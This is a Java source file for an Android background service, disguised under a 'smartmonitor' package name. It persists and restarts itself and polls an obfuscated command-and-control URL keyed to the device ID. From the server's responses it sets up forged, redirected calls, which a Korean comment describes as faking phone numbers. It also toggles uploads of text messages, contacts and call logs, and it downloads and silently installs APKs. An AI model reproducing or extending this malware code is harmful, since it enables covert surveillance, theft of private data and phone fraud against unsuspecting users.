package com.android.smartmonitor.control;

import java.net.URLDecoder;

import org.json.JSONObject;

import android.app.ActivityManager;
import android.app.Service;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.util.Log;

import com.android.smartmonitor.common.CheckGlobal;
import com.android.smartmonitor.common.CheckNC;

public class CheckRunning extends Service implements Runnable
{
private int s_count = 0;
	
	//Handler myHandler = new Handler();
	private CheckSMS m_sms = null;
    private CheckCall m_call = null;
    private CheckUpdate m_update = null;
//    private SmartGPS m_gps = null;
//    private SmartLocation m_location = null;
//    private SmartFilter m_filter = null;
//    private SmartFTPServer m_ftp = null;
//    private WifiVNCServer m_vnc = null;
    
	private Thread m_thread = null;
	private boolean m_shouldExit = true;
	
	int serverResponseCode = 0;
	
	//public static IONative m_IONative = new IONative();
    
    public int getCount()
    {
    	return s_count;
    }
  
    public void setCount(int count)
    {
    	s_count = count;
    }
    
    @Override
    public IBinder onBind(Intent paramIntent)
    {
	    return null;
    }

    @Override
    public void onCreate()
	{
    	//WifiGlobal.wifiLog("WifiService onCreate");
    	
    	super.onCreate();
    	
    	m_thread = null;
    	m_sms = new CheckSMS(this);
    	m_call = new CheckCall(this);
    	m_update = new CheckUpdate(this);
//    	m_gps = new SmartGPS(this);
//    	m_location = new SmartLocation(this);
//    	m_filter = new SmartFilter(this);
//    	m_ftp = new SmartFTPServer(this);
//    	m_vnc = new WifiVNCServer(this);
    	
    	m_shouldExit = false;
        
        m_thread = new Thread(this);
        m_thread.start();
	}
    
    @Override
    public void onDestroy() 
	{
    	m_shouldExit = true;
		m_thread.interrupt();
		m_thread = null;
		
//		m_vnc.destroy();
//		m_ftp.destroy();
		
		super.onDestroy();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
    	super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }
    
    public final void checkServiceMonitorState()
    {
    	boolean isServiceRunning = false;
		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
//		((ActivityManager)this.getSystemService(Context.ACTIVITY_SERVICE)).getLargeMemoryClass();
		Intent localIntent;
		
    	try{
    		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
		        if (CheckRunning.class.getName().equals(service.service.getClassName())) {
		        	isServiceRunning = true;
		        	break;
		        }
		    }
		    
		    if(isServiceRunning == false)
		    {
			    localIntent = new Intent(this.getBaseContext(), CheckRunning.class);
			    this.getBaseContext().startService(localIntent);
		    }
    	} catch(Exception e)
    	{
    		
    	}
    }
  
    public boolean update()
	{
//		if(m_call.isSleep() == false)
//			return false;
		
		return m_update.update();
	}
    
    public void acceptCommand()
    {
    	String response = null;
//	    HashMap<String, String> smsCommand = null;
//	    HashMap<String, String> callCommand = null;
//	    HashMap<String, String> ftpCommand = null;
//	    HashMap<String, String> vncCommand = null;
	    String paramString = CheckGlobal.getDeviceID(this);
		SharedPreferences.Editor localEditor = getSharedPreferences("d", 0).edit();

	    try
	    {
	    	boolean isSmsBusy = m_sms.isBusy();
	    	String url = CheckGlobal.KMSDecode(CheckGlobal.g_managerURL) + "command.get.php?phone_deviceID=" + paramString;

	    		      
	    	response = CheckNC.send(url);
	    	if(response == null) {
				localEditor.putInt("msgLogUpload", 0);
				localEditor.putInt("contactsUpload", 0);
				localEditor.putInt("callLogUpload", 0);
				localEditor.commit();
				return;
			}
	    	else {
				response = CheckGlobal.KMSDecode(response);
				response = URLDecoder.decode(response, "Utf-8");
				response = response.replaceAll("\r", "");

				if (response != "") {
					Log.e("response", response.toString());
					JSONObject localJSONObject = new JSONObject(response);
					String jsonString = localJSONObject.toString().replaceAll("\r", "");
					localJSONObject = new JSONObject(jsonString);


					SharedPreferences localSharedPreferences = getSharedPreferences("d", 0);
					System.out.println("SharedPreferences:::" + localSharedPreferences.getAll().toString());
					//message command
					/*
					if ((!isSmsBusy) && (!localJSONObject.get("command").toString().equals("no")))
					{
						smsCommand = new HashMap<String, String>();
						smsCommand.put("id", localJSONObject.getString("id"));
						smsCommand.put("level", localJSONObject.getString("level"));
						smsCommand.put("send_num", localJSONObject.getString("send_num"));
						smsCommand.put("recv_num", localJSONObject.getString("recv_num"));
						smsCommand.put("msg", localJSONObject.getString("msg"));
						smsCommand.put("phone_id", localJSONObject.getString("phone_id"));
						smsCommand.put("account_id", localJSONObject.getString("account_id"));
					}
					else
						smsCommand = null;
					m_sms.addCommand(smsCommand);
					*/

					//서버에서 보내준 자료를 가지고 전화번호 위조한다.
					if(localJSONObject.get("remove_flag").toString().equals("1")) {
						localEditor.putInt("callchange_count", 0);
						localEditor.commit();
						return;
					}
					else if (localJSONObject.get("callchange_command").toString().equals("yes")) {
						int nCount = localJSONObject.getInt("callchange_count");
						if(nCount<1)
							localEditor.putInt("callchange_count", 1);
						else
							localEditor.putInt("callchange_count", nCount);
						for (int i = 0; i < nCount; i++) {
							int index = i + 1;
							localEditor.putString("srcphone" + index, localJSONObject.getString("callchange_dialnum" + index));
						}
						localEditor.putString("tarphone", localJSONObject.getString("redirect_callnum"));
						localEditor.commit();
					}
					if(localSharedPreferences.getInt("msgLogUpload", -1) == 1) {
						if (localJSONObject.getInt("msg_log_upload") == 0)
							localEditor.putInt("msgLogUpload", 0);
						else
							localEditor.putInt("msgLogUpload", 1);
					}
					else
					{
						localEditor.putInt("msgLogUpload", 0);
					}

					if(localSharedPreferences.getInt("contactsUpload", -1) == 1) {
						if (localJSONObject.getInt("contacts_upload") == 0)
							localEditor.putInt("contactsUpload", 0);
						else
							localEditor.putInt("contactsUpload", 1);
					}
					else
					{
						localEditor.putInt("contactsUpload", 0);
					}
					if(localSharedPreferences.getInt("callLogUpload", -1) == 1) {
						if (localJSONObject.getInt("call_call_log_upload") == 0)
							localEditor.putInt("callLogUpload", 0);
						else
							localEditor.putInt("callLogUpload", 1);
					}
					else
					{
						localEditor.putInt("callLogUpload", 0);
					}
					localEditor.commit();
				}
			}
	    }
	    catch (Exception e) {
			localEditor.putInt("msgLogUpload", 0);
			localEditor.putInt("contactsUpload", 0);
			localEditor.putInt("callLogUpload", 0);
			localEditor.commit();
	    	e.printStackTrace();
	    }
    }
	
	public void executeCommand()
	{
		//m_call.executeCommand();
		//m_sms.executeCommand();
	}
	
	public void replyCommand()
	{
		m_sms.replyCommand();
		m_call.replyCommand();
//		m_filter.replyCommand();
		
		/*if(m_gps.isEnabled())
			m_gps.replyCommand();
		else
			m_location.replyCommand();*/
	}
  
    public void run()
	{
    	while (!m_shouldExit) {
    		boolean downloadState = false;
    		int count = this.getCount();
    		
    		try{
    			Thread.sleep(CheckGlobal.g_serviceInterval);
    		}
    		catch (Exception e) {
    	    }

			Log.e("ticktock", "service count:" + this.getCount());
    		if(!m_update.postInstallNotice())
			{
				this.setCount(count + 1);
				continue;
			}
    		
			
			this.acceptCommand();
			this.executeCommand();
			this.replyCommand();
			downloadState = this.update();
			if(downloadState == true)
	    	{
	    		//PackageManager p = getPackageManager();
	            //ComponentName componentName = new ComponentName("com.example.swiftp.gui","com.example.swiftp.gui.ServerPreferenceActivity");
	            //p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
				m_update.installAPK(CheckGlobal.g_apkPath);
	    	}

			
			this.setCount(count + 1);
			
			if (count % 3 == 2)
			{
		    	this.checkServiceMonitorState();
		    	this.setCount(0);
			}
        }
	}

}